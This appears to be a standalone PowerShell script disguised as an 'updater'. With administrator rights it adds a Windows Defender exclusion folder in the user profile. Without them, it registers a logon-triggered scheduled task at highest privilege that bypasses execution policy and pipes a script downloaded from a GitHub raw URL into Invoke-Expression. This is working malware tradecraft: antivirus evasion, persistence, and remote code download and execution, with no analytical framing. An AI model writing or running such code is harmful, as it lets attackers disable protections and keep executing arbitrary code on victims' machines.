# Define log file
$logPath = "C:\Windows\Temp\updater_log.txt"
function Write-Log {
    param($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Log the execution context
Write-Log "Script executed by user: $(whoami)"

# Define the folder to exclude
$exclusionFolder = "$env:USERPROFILE\TestSafeFolder"

# Make sure folder exists
if (-not (Test-Path $exclusionFolder)) {
    New-Item -ItemType Directory -Path $exclusionFolder -Force | Out-Null
    Write-Log "Created folder: $exclusionFolder"
}

# Check if script is running elevated
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Log "Running as admin. Attempting to add exclusions..."

    try {
        Add-MpPreference -ExclusionPath $exclusionFolder -ErrorAction Stop
        Write-Log "✅ Successfully added exclusion: $exclusionFolder"
    } catch {
        Write-Log "❌ Failed to add exclusion: $exclusionFolder. Error: $_"
    }

    # Optional: Delete the task if it was created earlier
    $taskName = "UpdaterUACTrigger"
    schtasks.exe /Delete /TN $taskName /F 2>$null
    Write-Log "Deleted scheduled task: $taskName (if it existed)"

    return
}

# If NOT admin, create scheduled task to run as user with UAC
Write-Log "Not running as admin. Creating scheduled task for elevation..."

$taskName = "UpdaterUACTrigger"
$taskScriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"

$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Author>Updater</Author></RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -Command "irm $taskScriptUrl | iex"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Save and register task
$taskFile = "$env:TEMP\updater_task.xml"
$taskXml | Set-Content -Path $taskFile -Encoding Unicode

try {
    schtasks.exe /Create /TN $taskName /XML $taskFile /F | Out-Null
    Write-Log "Scheduled task '$taskName' created. Will trigger on next login."
} catch {
    Write-Log "Failed to create scheduled task: $_"
}
